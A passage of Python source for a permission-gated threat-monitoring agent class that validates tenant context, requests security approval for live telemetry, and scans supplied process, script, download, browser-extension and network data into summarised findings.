                user_id=payload.get("user_id"),
                workspace_id=payload.get("workspace_id"),
                connections=payload.get("connections")
                or payload.get("network_connections")
                or [],
                dns_events=payload.get("dns_events") or [],
                context=payload.get("context"),
            )

        if action == "summarize_findings":
            return self.summarize_findings(
                findings=payload.get("findings") or [],
                user_id=payload.get("user_id"),
                workspace_id=payload.get("workspace_id"),
            )

        return self._error_result(
            message=f"Unsupported ThreatMonitor action: {action}",
            error={
                "code": "UNSUPPORTED_ACTION",
                "supported_actions": [
                    "monitor",
                    "analyze_snapshot",
                    "collect_live_snapshot",
                    "scan_processes",
                    "scan_scripts",
                    "scan_downloads",
                    "scan_browser_extensions",
                    "scan_network_behavior",
                    "summarize_findings",
                ],
            },
            metadata={
                "agent": self.agent_name,
                "module": self.module_name,
            },
        )

    def _safe_result(
        self,
        message: str,
        data: Optional[Dict[str, Any]] = None,
        metadata: Optional[Dict[str, Any]] = None,
        **extra: Any,
    ) -> Dict[str, Any]:
        """Return William/Jarvis structured success result."""
        result = {
            "success": True,
            "message": message,
            "data": data or {},
            "error": None,
            "metadata": metadata or {},
        }
        result.update(extra)
        return _json_safe(result)

    def _error_result(
        self,
        message: str,
        error: Optional[Union[str, Exception, Mapping[str, Any]]] = None,
        data: Optional[Dict[str, Any]] = None,
        metadata: Optional[Dict[str, Any]] = None,
        **extra: Any,
    ) -> Dict[str, Any]:
        """Return William/Jarvis structured failure result."""
        if isinstance(error, Exception):
            error_payload: Any = {
                "type": error.__class__.__name__,
                "detail": str(error),
            }
        elif isinstance(error, Mapping):
            error_payload = dict(error)
        else:
            error_payload = error or message

        result = {
            "success": False,
            "message": message,
            "data": data or {},
            "error": error_payload,
            "metadata": metadata or {},
        }
        result.update(extra)
        return _json_safe(result)

    def _validate_task_context(
        self,
        user_id: Optional[str],
        workspace_id: Optional[str],
        **context: Any,
    ) -> Dict[str, Any]:
        """
        Validate mandatory SaaS tenant context.

        Threat telemetry, audit events, findings, and dashboard data must never
        cross user/workspace boundaries.
        """
        errors: List[str] = []

        if not user_id or not _normalize_text(user_id):
            errors.append("user_id is required.")

        if not workspace_id or not _normalize_text(workspace_id):
            errors.append("workspace_id is required.")

        requested_user_id = context.get("requested_user_id")
        if requested_user_id is not None:
            if str(requested_user_id) != str(user_id):
                errors.append("requested_user_id does not match user_id.")

        requested_workspace_id = context.get("requested_workspace_id")
        if requested_workspace_id is not None:
            if str(requested_workspace_id) != str(workspace_id):
                errors.append(
                    "requested_workspace_id does not match workspace_id."
                )

        if _coerce_bool(context.get("cross_workspace"), False):
            errors.append("Cross-workspace threat monitoring is not permitted.")

        if errors:
            return self._error_result(
                message="Invalid threat-monitor task context.",
                error={
                    "code": "INVALID_TASK_CONTEXT",
                    "details": errors,
                },
                metadata={
                    "agent": self.agent_name,
                    "module": self.module_name,
                },
            )

        return self._safe_result(
            message="Threat-monitor task context validated.",
            data={
                "user_id": str(user_id),
                "workspace_id": str(workspace_id),
            },
            metadata={
                "agent": self.agent_name,
                "module": self.module_name,
            },
        )

    def _requires_security_check(
        self,
        action: str,
        live: bool = False,
        context: Optional[Mapping[str, Any]] = None,
    ) -> bool:
        """
        Determine whether Security Agent approval is mandatory.

        Analyzing caller-supplied data is passive. Reading live process,
        command-line, browser-profile, file-system, or connection telemetry is
        sensitive and requires approval.
        """
        normalized_action = _normalize_lower(action)
        request_context = dict(context or {})

        if live:
            return True

        if normalized_action in SENSITIVE_ACTIONS:
            return True

        if _coerce_bool(request_context.get("collect_live_data"), False):
            return True

        if _coerce_bool(request_context.get("read_command_lines"), False):
            return True

        if _coerce_bool(request_context.get("read_browser_profiles"), False):
            return True

        if _coerce_bool(request_context.get("read_network_connections"), False):
            return True

        return False

    async def _request_security_approval(
        self,
        user_id: str,
        workspace_id: str,
        action: str,
        reason: str,
        payload: Optional[Mapping[str, Any]] = None,
    ) -> Dict[str, Any]:
        """
        Ask Security Agent/Approval Manager for permission.

        If no security client exists, live monitoring is denied unless the
        configuration explicitly permits collection without an external
        approval client.
        """
        approval_request = {
            "request_id": str(uuid.uuid4()),
            "user_id": user_id,
            "workspace_id": workspace_id,
            "requesting_agent": self.agent_name,
            "module": self.module_name,
            "action": action,
            "reason": reason,
            "risk_level": "high",
            "payload": _json_safe(payload or {}),
            "requested_at": _utc_now().isoformat(),
        }

        if self.security_client is None:
            if self.monitor_config.allow_live_collection_without_security:
                return self._safe_result(
                    message="Security approval bypassed by explicit configuration.",
                    data={
                        "approved": True,
                        "approval_id": "configured_local_bypass",
                        "request": approval_request,
                    },
                    metadata={
                        "security_client": "not_configured",
                        "bypass": True,
                    },
                )

            return self._error_result(
                message=(
                    "Security approval is required for live threat telemetry "
                    "collection, but no Security Agent client is configured."
                ),
                error={
                    "code": "SECURITY_APPROVAL_REQUIRED",
                    "action": action,
                    "reason": reason,
                },
                data={
                    "approval_request": approval_request,
                },
            )

        try:
            if hasattr(self.security_client, "request_approval"):
                response = await _maybe_await(
                    self.security_client.request_approval(**approval_request)
                )
            elif hasattr(self.security_client, "authorize"):
                response = await _maybe_await(
                    self.security_client.authorize(approval_request)
                )
            elif callable(self.security_client):
                response = await _maybe_await(
                    self.security_client(approval_request)
                )
            else:
                return self._error_result(
                    message="Configured security client is invalid.",
                    error={
                        "code": "INVALID_SECURITY_CLIENT",
                    },
                )

            approved = False

            if isinstance(response, Mapping):
                approved = bool(
                    response.get("approved")
                    or response.get("success")
                    or (
                        isinstance(response.get("data"), Mapping)
                        and response["data"].get("approved")
                    )
                )
            else:
                approved = bool(response)

            if not approved:
                return self._error_result(
                    message="Security Agent denied threat telemetry collection.",
                    error={
                        "code": "SECURITY_APPROVAL_DENIED",
                        "response": _json_safe(response),
                    },
                )

            return self._safe_result(
                message="Security Agent approved threat telemetry collection.",
                data={
                    "approved": True,
                    "response": _json_safe(response),
                    "request": approval_request,
                },
            )

        except Exception as exc:
            self.log.exception("Security approval request failed.")
            return self._error_result(
                message="Security approval request failed.",
                error=exc,
            )

    def _prepare_verification_payload(
        self,
        user_id: str,
        workspace_id: str,
        scan_id: str,
        snapshot: ThreatSnapshot,
        findings: Sequence[ThreatFinding],
        summary: Mapping[str, Any],
        duration_ms: int,
    ) -> Dict[str, Any]:
        """
        Prepare Verification Agent payload.

        Verification Agent can validate:
            - tenant isolation
            - enabled component coverage
            - finding counts and severities
            - absence of destructive remediation
            - scan integrity and result structure
        """
        finding_ids = [finding.finding_id for finding in findings]

        return {
            "verification_type": "security_threat_monitor_scan",
            "scan_id": scan_id,
            "user_id": user_id,
            "workspace_id": workspace_id,
            "agent": self.agent_name,
            "module": self.module_name,
            "version": self.version,
            "snapshot_hash": _stable_hash(
                {
                    "source": snapshot.source,
                    "collected_at": snapshot.collected_at,
                    "counts": {
                        "processes": len(snapshot.processes),
                        "scripts": len(snapshot.scripts),
                        "downloads": len(snapshot.downloads),
                        "browser_extensions": len(snapshot.browser_extensions),
                        "network_connections": len(snapshot.network_connections),
                        "dns_events": len(snapshot.dns_events),
                    },
                }
            ),
            "finding_count": len(findings),
            "finding_ids": finding_ids,
            "finding_hash": _stable_hash(finding_ids),
            "summary": _json_safe(summary),
            "duration_ms": duration_ms,
            "destructive_action_performed": False,
            "verification_checks": [
                "confirm_user_workspace_isolation",
                "confirm_component_count_consistency",
                "confirm_severity_count_consistency",
                "confirm_no_destructive_action",
                "confirm_structured_result_schema",
            ],
            "created_at": _utc_now().isoformat(),
        }

    def _prepare_memory_payload(
        self,
        user_id: str,
        workspace_id: str,
        scan_id: str,
        findings: Sequence[ThreatFinding],
        summary: Mapping[str, Any],
    ) -> Dict[str, Any]:
        """
        Prepare safe Memory Agent context.

        Full process command lines, URLs, IP addresses, and file contents are
        intentionally excluded. Memory Agent receives a summarized security
        context and finding identifiers.
        """
        top_findings = sorted(
            findings,
            key=lambda finding: finding.risk_score,
            reverse=True,
        )[:10]

        return {
            "memory_event_type": "security_threat_scan",
            "scan_id": scan_id,
            "user_id": user_id,
            "workspace_id": workspace_id,
            "source_agent": self.agent_name,
            "summary": _json_safe(summary),
            "top_findings": [
                {
                    "finding_id": finding.finding_id,
                    "category": finding.category,
                    "severity": finding.severity,
                    "title": finding.title,
                    "risk_score": finding.risk_score,
                }
                for finding in top_findings
            ],
            "contains_raw_sensitive_telemetry": False,
            "created_at": _utc_now().isoformat(),
        }

    async def _emit_agent_event(
        self,
        event_name: str,
        payload: Optional[Mapping[str, Any]] = None,
    ) -> Dict[str, Any]:
        """Emit an event for Dashboard/API, Router, or event bus."""
        event = {
            "event_id": str(uuid.uuid4()),
            "event_name": event_name,
            "agent": self.agent_name,
            "module": self.module_name,
            "payload": _json_safe(payload or {}),
            "created_at": _utc_now().isoformat(),
        }

        if not self.monitor_config.emit_events:
            return self._safe_result(
                message="Threat-monitor event emission disabled.",
                data={"event": event},
                metadata={"emitted": False},
            )

        if self.event_emitter is None:
            return self._safe_result(
                message="No event emitter configured; event safely skipped.",
                data={"event": event},
                metadata={"emitted": False},
            )

        try:
            response = await _maybe_await(self.event_emitter(event))
            return self._safe_result(
                message="Threat-monitor event emitted.",
                data={
                    "event": event,
                    "response": _json_safe(response),
                },
                metadata={"emitted": True},
            )
        except Exception as exc:
            self.log.exception("Threat-monitor event emission failed.")
            return self._error_result(
                message="Threat-monitor event emission failed.",
                error=exc,
                data={"event": event},
            )

    async def _log_audit_event(
        self,
        action: str,
        user_id: str,
        workspace_id: str,
        payload: Optional[Mapping[str, Any]] = None,
    ) -> Dict[str, Any]:
        """Write a tenant-scoped audit event."""
        event = {
            "audit_id": str(uuid.uuid4()),
            "action": action,
            "user_id": user_id,
            "workspace_id": workspace_id,
            "agent": self.agent_name,
            "module": self.module_name,
            "payload": _json_safe(payload or {}),
            "created_at": _utc_now().isoformat(),
        }

        if not self.monitor_config.audit_enabled:
            return self._safe_result(
                message="Threat-monitor auditing disabled.",
                data={"audit_event": event},
                metadata={"logged": False},
            )

        if self.audit_logger is None:
            return self._safe_result(
                message="No audit logger configured; audit safely skipped.",
                data={"audit_event": event},
                metadata={"logged": False},
            )

        try:
            response = await _maybe_await(self.audit_logger(event))
            return self._safe_result(
                message="Threat-monitor audit event logged.",
                data={
                    "audit_event": event,
                    "response": _json_safe(response),
                },
                metadata={"logged": True},
            )
        except Exception as exc:
            self.log.exception("Threat-monitor audit logging failed.")
            return self._error_result(
                message="Threat-monitor audit logging failed.",
                error=exc,
                data={"audit_event": event},
            )

    # =========================================================================
    # Main public operations
    # =========================================================================

    async def monitor(
        self,
        user_id: Optional[str],
        workspace_id: Optional[str],
        snapshot: Optional[Union[ThreatSnapshot, Mapping[str, Any]]] = None,
        live: bool = False,
        components: Optional[Sequence[str]] = None,
        context: Optional[Mapping[str, Any]] = None,
    ) -> Dict[str, Any]:
        """
        Run a complete threat monitoring cycle.

        If snapshot is supplied, it is analyzed without reading the local
        machine. If live=True and no snapshot is supplied, permission-gated
        live telemetry collection is attempted.
        """
        request_context = dict(context or {})

        validation = self._validate_task_context(
            user_id=user_id,
            workspace_id=workspace_id,
            **request_context,
        )
        if not validation["success"]:
            return validation

        safe_user_id = str(user_id)
        safe_workspace_id = str(workspace_id)

        if snapshot is None and not live:
            return self._error_result(
                message=(
                    "A telemetry snapshot is required unless live monitoring "
                    "is explicitly requested."
                ),
                error={
                    "code": "SNAPSHOT_REQUIRED",
                },
            )

        if snapshot is None and live:
            collection_result = await self.collect_live_snapshot(
                user_id=safe_user_id,
                workspace_id=safe_workspace_id,
                components=components,
                context=request_context,
            )

            if not collection_result["success"]:
                return collection_result

            snapshot = collection_result["data"]["snapshot"]

        return await self.analyze_snapshot(
            user_id=safe_user_id,
            workspace_id=safe_workspace_id,
            snapshot=snapshot or {},
            components=components,
            context=request_context,
        )

    async def analyze_snapshot(
        self,
        user_id: Optional[str],
        workspace_id: Optional[str],
        snapshot: Union[ThreatSnapshot, Mapping[str, Any]],
        components: Optional[Sequence[str]] = None,
        context: Optional[Mapping[str, Any]] = None,
    ) -> Dict[str, Any]:
        """
        Analyze a supplied telemetry snapshot.

        This operation is passive. It does not modify the host, network,
        browser, files, processes, or extensions.
        """
        started_at = _utc_now()
        request_context = dict(context or {})

        validation = self._validate_task_context(
            user_id=user_id,
            workspace_id=workspace_id,
            **request_context,
        )
        if not validation["success"]:
            return validation

        safe_user_id = str(user_id)
        safe_workspace_id = str(workspace_id)
        scan_id = f"threat_scan_{uuid.uuid4().hex}"

        try:
            normalized_snapshot = self._normalize_snapshot(snapshot)
            enabled_components = self._normalize_components(components)

            await self._emit_agent_event(
                "security.threat_monitor.scan_started",
                {
                    "scan_id": scan_id,
                    "user_id": safe_user_id,
                    "workspace_id": safe_workspace_id,
                    "components": enabled_components,
                    "snapshot_source": normalized_snapshot.source,
                },
            )

            findings: List[ThreatFinding] = []
            component_results: Dict[str, Any] = {}

            if (
                "processes" in enabled_components
                and self.monitor_config.enable_process_monitoring
            ):
                result = await self.scan_processes(
                    user_id=safe_user_id,
                    workspace_id=safe_workspace_id,
                    processes=normalized_snapshot.processes,
                    context={
                        **request_context,
                        "scan_id": scan_id,
                        "nested_scan": True,
                    },
                )
                component_results["processes"] = result
                findings.extend(self._extract_findings_from_result(result))

            if (
                "scripts" in enabled_components
                and self.monitor_config.enable_script_monitoring
            ):
                result = await self.scan_scripts(
                    user_id=safe_user_id,
                    workspace_id=safe_workspace_id,
                    scripts=normalized_snapshot.scripts,
                    context={
                        **request_context,
                        "scan_id": scan_id,
                        "nested_scan": True,
                    },
                )
                component_results["scripts"] = result
                findings.extend(self._extract_findings_from_result(result))

            if (
                "downloads" in enabled_components
                and self.monitor_config.enable_download_monitoring
            ):
                result = await self.scan_downloads(
                    user_id=safe_user_id,
                    workspace_id=safe_workspace_id,
                    downloads=normalized_snapshot.downloads,
                    context={
                        **request_context,
                        "scan_id": scan_id,
                        "nested_scan": True,
                    },
                )
                component_results["downloads"] = result
                findings.extend(self._extract_findings_from_result(result))

            if (
                "browser_extensions" in enabled_components
                and self.monitor_config.enable_extension_monitoring
            ):
                result = await self.scan_browser_extensions(
                    user_id=safe_user_id,
                    workspace_id=safe_workspace_id,
                    extensions=normalized_snapshot.browser_extensions,
                    context={
                        **request_context,
                        "scan_id": scan_id,
                        "nested_scan": True,
                    },
                )
                component_results["browser_extensions"] = result
                findings.extend(self._extract_findings_from_result(result))

            if (
                "network" in enabled_components
                and self.monitor_config.enable_network_monitoring
            ):
                result = await self.scan_network_behavior(
                    user_id=safe_user_id,
                    workspace_id=safe_workspace_id,
                    connections=normalized_snapshot.network_connections,
                    dns_events=normalized_snapshot.dns_events,
                    context={
                        **request_context,
                        "scan_id": scan_id,
                        "nested_scan": True,
                    },
                )
                component_results["network"] = result
                findings.extend(self._extract_findings_from_result(result))

            findings = self._deduplicate_findings(findings)
            findings = sorted(
                findings,
                key=lambda item: item.risk_score,
                reverse=True,
            )[: self.monitor_config.max_findings]

            summary_result = self.summarize_findings(
                findings=[finding.to_dict() for finding in findings],
                user_id=safe_user_id,
                workspace_id=safe_workspace_id,
            )
            summary = summary_result["data"]["summary"]

            duration_ms = int(
                (_utc_now() - started_at).total_seconds() * 1_000
            )

            verification_payload = self._prepare_verification_payload(
                user_id=safe_user_id,
                workspace_id=safe_workspace_id,
                scan_id=scan_id,
                snapshot=normalized_snapshot,
                findings=findings,
                summary=summary,
                duration_ms=duration_ms,
            )

            memory_payload = self._prepare_memory_payload(
                user_id=safe_user_id,
                workspace_id=safe_workspace_id,
                scan_id=scan_id,
                findings=findings,
                summary=summary,
            )

            await self._log_audit_event(
                action="threat_monitor_scan_completed",
                user_id=safe_user_id,
                workspace_id=safe_workspace_id,
                payload={
                    "scan_id": scan_id,
                    "components": enabled_components,
                    "summary": summary,
                    "duration_ms": duration_ms,
                    "destructive_action_performed": False,
                },
            )

            await self._emit_agent_event(
                "security.threat_monitor.scan_completed",
                {
                    "scan_id": scan_id,
                    "user_id": safe_user_id,
                    "workspace_id": safe_workspace_id,
                    "summary": summary,
                    "duration_ms": duration_ms,
                },
            )

            response_data: Dict[str, Any] = {
                "scan_id": scan_id,
                "findings": [finding.to_dict() for finding in findings],
                "summary": summary,
                "component_results": component_results,
                "verification_payload": verification_payload,
                "memory_payload": memory_payload,
            }

            if self.monitor_config.include_raw_snapshot_in_result:
                response_data["snapshot"] = normalized_snapshot.to_dict()

            return self._safe_result(
                message="Threat-monitor snapshot analysis completed.",
                data=response_data,
                metadata={
                    "agent": self.agent_name,
                    "module": self.module_name,
                    "version": self.version,
                    "duration_ms": duration_ms,
                    "components": enabled_components,
                    "snapshot_source": normalized_snapshot.source,
                    "non_destructive": True,
                },
            )

        except Exception as exc:
            self.log.exception("Threat-monitor snapshot analysis failed.")

            await self._log_audit_event(
                action="threat_monitor_scan_failed",
                user_id=safe_user_id,
                workspace_id=safe_workspace_id,
                payload={
                    "scan_id": scan_id,
                    "error_type": exc.__class__.__name__,
                    "error": str(exc),
                },
            )

            return self._error_result(
                message="Threat-monitor snapshot analysis failed.",
                error=exc,
                metadata={
                    "scan_id": scan_id,
                    "agent": self.agent_name,
                    "module": self.module_name,
                },
            )

    async def scan_processes(
        self,
        user_id: Optional[str],
        workspace_id: Optional[str],
        processes: Sequence[Mapping[str, Any]],
        context: Optional[Mapping[str, Any]] = None,
    ) -> Dict[str, Any]:
        """Detect suspicious process names, paths, commands, and behavior."""
        validation = self._validate_task_context(
            user_id=user_id,
            workspace_id=workspace_id,
            **dict(context or {}),
        )
        if not validation["success"]:
            return validation

        safe_user_id = str(user_id)
        safe_workspace_id = str(workspace_id)
        findings: List[ThreatFinding] = []

        normalized_processes = [
            dict(process)
            for process in list(processes)[: self.monitor_config.max_process_count]
            if isinstance(process, Mapping)
        ]

        parent_map: Dict[int, Dict[str, Any]] = {}
        for process in normalized_processes:
            pid = _coerce_int(process.get("pid"), -1)
            if pid >= 0:
                parent_map[pid] = process

        for process in normalized_processes:
            findings.extend(
                self._analyze_process(
                    process=process,
                    parent_map=parent_map,
                    user_id=safe_user_id,
                    workspace_id=safe_workspace_id,
                )
            )

        findings = self._deduplicate_findings(findings)

        return self._safe_result(
            message="Process threat scan completed.",
            data={
                "scanned": len(normalized_processes),
                "finding_count": len(findings),
                "findings": [finding.to_dict() for finding in findings],
            },
            metadata={
                "component": "processes",
                "agent": self.agent_name,
                "non_destructive": True,
            },
        )

    async def scan_scripts(
        self,
        user_id: Optional[str],
        workspace_id: Optional[str],
        scripts: Sequence[Mapping[str, Any]],
        context: Optional[Mapping[str, Any]] = None,
    ) -> Dict[str, Any]:
        """Detect suspicious script content, commands, names, and locations."""
        validation = self._validate_task_context(
            user_id=user_id,
            workspace_id=workspace_id,
            **dict(context or {}),
        )
        if not validation["success"]:
            return validation

        safe_user_id = str(user_id)
        safe_workspace_id = str(workspace_id)
        findings: List[ThreatFinding] = []

        normalized_scripts = [
            dict(script)
            for script in scripts
            if isinstance(script, Mapping)
        ]

        for script in normalized_scripts:
            findings.extend(
                self._analyze_script(
                    script=script,
                    user_id=safe_user_id,
                    workspace_id=safe_workspace_id,
                )
            )

        findings = self._deduplicate_findings(findings)

        return self._safe_result(
            message="Script threat scan completed.",
            data={
                "scanned": len(normalized_scripts),
                "finding_count": len(findings),
                "findings": [finding.to_dict() for finding in findings],
            },
            metadata={
                "component": "scripts",
                "agent": self.agent_name,
                "non_destructive": True,
            },
        )

    async def scan_downloads(
        self,
        user_id: Optional[str],
        workspace_id: Optional[str],
        downloads: Sequence[Mapping[str, Any]],
        context: Optional[Mapping[str, Any]] = None,
    ) -> Dict[str, Any]:
        """Detect risky download names, extensions, sources, and metadata."""
        validation = self._validate_task_context(
            user_id=user_id,
            workspace_id=workspace_id,
            **dict(context or {}),
        )
        if not validation["success"]:
            return validation

        safe_user_id = str(user_id)
        safe_workspace_id = str(workspace_id)
        findings: List[ThreatFinding] = []

        normalized_downloads = [
            dict(download)
            for download in list(downloads)[: self.monitor_config.max_download_count]
            if isinstance(download, Mapping)
        ]

        for download in normalized_downloads:
            findings.extend(
                self._analyze_download(
                    download=download,
                    user_id=safe_user_id,
                    workspace_id=safe_workspace_id,
                )
            )

        findings = self._deduplicate_findings(findings)

        return self._safe_result(
            message="Download threat scan completed.",
            data={
                "scanned": len(normalized_downloads),
                "finding_count": len(findings),
                "findings": [finding.to_dict() for finding in findings],
            },
            metadata={
                "component": "downloads",
                "agent": self.agent_name,
                "non_destructive": True,
            },
        )

    async def scan_browser_extensions(
        self,
        user_id: Optional[str],
        workspace_id: Optional[str],
        extensions: Sequence[Mapping[str, Any]],
        context: Optional[Mapping[str, Any]] = None,
    ) -> Dict[str, Any]:
        """Detect suspicious browser extension permissions and metadata."""
        validation = self._validate_task_context(
            user_id=user_id,
            workspace_id=workspace_id,
            **dict(context or {}),
        )
        if not validation["success"]:
            return validation

        safe_user_id = str(user_id)
        safe_workspace_id = str(workspace_id)
        findings: List[ThreatFinding] = []

        normalized_extensions = [
            dict(extension)
            for extension in list(extensions)[: self.monitor_config.max_extension_count]
            if isinstance(extension, Mapping)
        ]

        for extension in normalized_extensions:
            findings.extend(
                self._analyze_browser_extension(
                    extension=extension,
                    user_id=safe_user_id,
                    workspace_id=safe_workspace_id,
                )
            )

        findings = self._deduplicate_findings(findings)

        return self._safe_result(
            message="Browser-extension threat scan completed.",
            data={
                "scanned": len(normalized_extensions),
                "finding_count": len(findings),
                "findings": [finding.to_dict() for finding in findings],
            },
            metadata={
                "component": "browser_extensions",
                "agent": self.agent_name,
                "non_destructive": True,
            },
        )

    async def scan_network_behavior(
        self,
        user_id: Optional[str],
        workspace_id: Optional[str],
        connections: Sequence[Mapping[str, Any]],
        dns_events: Optional[Sequence[Mapping[str, Any]]] = None,
        context: Optional[Mapping[str, Any]] = None,
    ) -> Dict[str, Any]:
        """Detect suspicious destinations, ports, bursts, and DNS behavior."""
        validation = self._validate_task_context(
            user_id=user_id,
            workspace_id=workspace_id,
            **dict(context or {}),
        )
        if not validation["success"]:
            return validation

        safe_user_id = str(user_id)
        safe_workspace_id = str(workspace_id)

        normalized_connections = [
            dict(connection)
            for connection in list(connections)[
                : self.monitor_config.max_connection_count
            ]
            if isinstance(connection, Mapping)
        ]

        normalized_dns_events = [
            dict(event)
            for event in list(dns_events or [])[
                : self.monitor_config.max_connection_count
            ]
            if isinstance(event, Mapping)
        ]

        findings: List[ThreatFinding] = []

        for connection in normalized_connections:
            findings.extend(
                self._analyze_network_connection(
                    connection=connection,
                    user_id=safe_user_id,
                    workspace_id=safe_workspace_id,
                )
            )

        findings.extend(
            self._analyze_network_aggregates(
                connections=normalized_connections,
                user_id=safe_user_id,
                workspace_id=safe_workspace_id,
            )
        )

        findings.extend(
            self._analyze_dns_events(
                dns_events=normalized_dns_events,
                user_id=safe_user_id,
                workspace_id=safe_workspace_id,
            )
        )

        findings = self._deduplicate_findings(findings)

        return self._safe_result(
            message="Network behavior threat scan completed.",
            data={
                "connections_scanned": len(normalized_connections),
                "dns_events_scanned": len(normalized_dns_events),
                "finding_count": len(findings),
                "findings": [finding.to_dict() for finding in findings],
            },
            metadata={
                "component": "network",
                "agent": self.agent_name,
                "non_destructive": True,
            },
        )

    def summarize_findings(
        self,
        findings: Sequence[Union[ThreatFinding, Mapping[str, Any]]],
        user_id: Optional[str],
        workspace_id: Optional[str],
    ) -> Dict[str, Any]:
        """Create a dashboard/API-ready threat summary."""
        validation = self._validate_task_context(
            user_id=user_id,
            workspace_id=workspace_id,
        )
        if not validation["success"]:
            return validation

        normalized: List[Dict[str, Any]] = []

        for finding in findings:
            if isinstance(finding, ThreatFinding):
                normalized.append(finding.to_dict())
            elif isinstance(finding, Mapping):
                normalized.append(dict(finding))

        severity_counts: Counter[str] = Counter()
        category_counts: Counter[str] = Counter()
        status_counts: Counter[str] = Counter()

        risk_scores: List[float] = []

        for finding in normalized:
            severity_counts[
                _normalize_lower(finding.get("severity") or "info")
            ] += 1
            category_counts[
                _normalize_lower(finding.get("category") or "unknown")
            ] += 1
            status_counts[
                _normalize_lower(finding.get("status") or "open")
            ] += 1
            risk_scores.append(
                _clamp(_coerce_float(finding.get("risk_score"), 0.0))
            )

        highest_score = max(risk_scores, default=0.0)
        average_score = (
            sum(risk_scores) / len(risk_scores)
            if risk_scores
            else 0.0
        )

        critical_or_high = (
            severity_counts[ThreatSeverity.CRITICAL.value]
            + severity_counts[ThreatSeverity.HIGH.value]
        )

        if severity_counts[ThreatSeverity.CRITICAL.value] > 0:
            overall_status = "critical"
        elif severity_counts[ThreatSeverity.HIGH.value] > 0:
            overall_status = "high_risk"
        elif severity_counts[ThreatSeverity.MEDIUM.value] > 0:
            overall_status = "review_required"
        elif severity_counts[ThreatSeverity.LOW.value] > 0:
            overall_status = "low_risk"
        else:
            overall_status = "no_detected_threats"

        sorted_findings = sorted(
            normalized,
            key=lambda item: _coerce_float(item.get("risk_score"), 0.0),
            reverse=True,
        )

        top_findings = [
            {
                "finding_id": finding.get("finding_id"),
                "title": finding.get("title"),
                "category": finding.get("category"),
                "severity": finding.get("severity"),
                "risk_score": finding.get("risk_score"),
            }
            for finding in sorted_findings[:10]
        ]

        summary = {
            "total_findings": len(normalized),
            "overall_status": overall_status,
            "highest_risk_score": round(highest_score, 2),
            "average_risk_score": round(average_score, 2),
            "critical_or_high_count": critical_or_high,
            "severity_counts": dict(severity_counts),
            "category_counts": dict(category_counts),
            "status_counts": dict(status_counts),
            "top_findings": top_findings,
            "requires_immediate_review": bool(
                severity_counts[ThreatSeverity.CRITICAL.value]
                or severity_counts[ThreatSeverity.HIGH.value]
            ),
            "generated_at": _utc_now().isoformat(),
        }

        return self._safe_result(
            message="Threat findings summarized.",
            data={"summary": summary},
            metadata={
                "agent": self.agent_name,
                "module": self.module_name,
            },
        )

    # =========================================================================
    # Permission-gated live telemetry collection
    # =========================================================================

    async def collect_live_snapshot(
        self,
        user_id: Optional[str],
        workspace_id: Optional[str],
        components: Optional[Sequence[str]] = None,
        context: Optional[Mapping[str, Any]] = None,
    ) -> Dict[str, Any]:
        """
        Collect a limited local telemetry snapshot after security approval.

        No destructive action is performed. Collection can use a custom
        telemetry_adapter or optional psutil fallback.

        Browser-extension and download collection are intentionally adapter-
        driven because browser profile and filesystem access require explicit
        product-specific permission handling.
        """
        request_context = dict(context or {})

        validation = self._validate_task_context(
            user_id=user_id,
            workspace_id=workspace_id,
            **request_context,
        )
        if not validation["success"]:
            return validation

        safe_user_id = str(user_id)
        safe_workspace_id = str(workspace_id)
        enabled_components = self._normalize_components(components)

        approval = await self._request_security_approval(
            user_id=safe_user_id,
            workspace_id=safe_workspace_id,
            action="collect_live_snapshot",
            reason=(
                "Live threat monitoring reads sensitive process, network, "
                "browser, or filesystem telemetry."
            ),
            payload={
                "components": enabled_components,
                "command_line_collection": (
                    self.monitor_config.allow_command_line_collection
                ),
                "username_collection": (
                    self.monitor_config.allow_username_collection
                ),
                "environment_collection": (
                    self.monitor_config.allow_environment_collection
                ),
            },
        )
        if not approval["success"]:
            await self._log_audit_event(
                action="threat_monitor_live_collection_denied",
                user_id=safe_user_id,
                workspace_id=safe_workspace_id,
                payload={
                    "components": enabled_components,
                },
            )
            return approval

        try:
            if self.telemetry_adapter is not None:
                snapshot = await self._collect_with_adapter(
                    user_id=safe_user_id,
                    workspace_id=safe_workspace_id,
                    components=enabled_components,
                    context=request_context,
                )
            else:
                snapshot = await self._collect_with_local_fallback(
                    components=enabled_components,
                )

            await self._log_audit_event(
                action="threat_monitor_live_snapshot_collected",
                user_id=safe_user_id,
                workspace_id=safe_workspace_id,
                payload={
                    "components": enabled_components,
                    "snapshot_counts": {
                        "processes": len(snapshot.processes),
                        "scripts": len(snapshot.scripts),
                        "downloads": len(snapshot.downloads),
                        "browser_extensions": len(snapshot.browser_extensions),
                        "network_connections": len(snapshot.network_connections),
                        "dns_events": len(snapshot.dns_events),
                    },
                },
            )

            return self._safe_result(
                message="Permission-approved live telemetry snapshot collected.",
                data={
                    "snapshot": snapshot.to_dict(),
                },
                metadata={
                    "agent": self.agent_name,
                    "module": self.module_name,
                    "components": enabled_components,
                    "security_approved": True,
                    "non_destructive": True,
                },
            )

        except Exception as exc:
            self.log.exception("Live threat telemetry collection failed.")

            return self._error_result(
                message="Live threat telemetry collection failed.",
                error=exc,
                metadata={
                    "security_approved": True,
                    "non_destructive": True,
                },
            )

    async def _collect_with_adapter(
        self,
        user_id: str,
        workspace_id: str,
        components: Sequence[str],
        context: Mapping[str, Any],
    ) -> ThreatSnapshot:
        """Collect telemetry using a configured product adapter."""
        adapter = self.telemetry_adapter

        if hasattr(adapter, "collect_snapshot"):
            response = await _maybe_await(
                adapter.collect_snapshot(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    components=list(components),
                    context=dict(context),
                )
            )
        elif callable(adapter):
            response = await _maybe_await(
                adapter(
                    {
                        "user_id": user_id,
                        "workspace_id": workspace_id,
                        "components": list(components),
                        "context": dict(context),
                    }
                )
            )
        else:
            raise TypeError(
                "telemetry_adapter must be callable or expose collect_snapshot()."
            )

        if isinstance(response, Mapping):
            if (
                isinstance(response.get("data"), Mapping)
                and "snapshot" in response["data"]
            ):
                response = response["data"]["snapshot"]
            elif "snapshot" in response:
                response = response["snapshot"]

        return self._normalize_snapshot(response or {})

    async def _collect_with_local_fallback(
        self,
        components: Sequence[str],
    ) -> ThreatSnapshot:
        """Collect limited local telemetry using optional psutil."""
        snapshot = ThreatSnapshot(
            source="local_psutil_fallback",
            metadata={
                "platform": platform.system(),
                "platform_release": platform.release(),
                "psutil_available": psutil is not None,
            },
        )

        if psutil is None:
            snapshot.metadata["collection_warning"] = (
                "psutil is unavailable. No process or network telemetry "
                "was collected."
            )
            return snapshot

        if "processes" in components:
            snapshot.processes = await asyncio.to_thread(
                self._collect_local_processes
